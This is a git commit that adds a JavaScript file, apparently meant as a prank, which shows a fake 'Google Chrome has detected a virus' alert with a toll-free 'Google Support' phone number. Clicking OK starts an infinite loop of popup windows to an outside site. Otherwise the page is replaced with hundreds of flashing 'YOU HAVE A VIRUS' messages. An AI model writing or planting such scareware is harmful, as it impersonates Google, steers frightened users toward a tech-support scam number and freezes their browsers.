619e5cdd30b71d634f80755f6f4ff4aa3b23e92d
Jesse Liang <jesseliang@ymail.com>
2016-04-09 10:13:03 -0700

    things are cool

---
+++ troll/lel.js
@@ -0,0 +1,17 @@
+var r = confirm("Google Chrome has detected a virus! Call this toll free number for Google Support: 888-513-6392.");
+
+if (r == true) {
+	while (9 + 10 != 21) {
+		window.open("http://www.fallingfalling.com/")
+	}
+} else {
+	$("body").remove(); 
+	document.write("<body class='things' style='background-color: black; text-align: center'><br><br><div><font color='red'><h1 style='font-family: 'Arial Black', Gadget, sans-serif>GOOGLE CHROME HAS DETECTED A VIRUS!</h1></div><br><h1>FOR GOOGLE CHROME SUPPORT,</h1><h1>CALL THIS TOLL FREE NUMBER: 888-513-6392</h1></font><br><br><br><br></body>");
+
+	for (x=0; 500>x; x++){
+		document.write("<div style='text-align: center'><font color='red'><h1>YOU HAVE A VIRUS!!!</h1></font><br></div>")
+	};
+	for (var i = 5000; i >= 1; i--){
+		$("body").fadeOut(50).fadeIn(50)
+	}          
+}
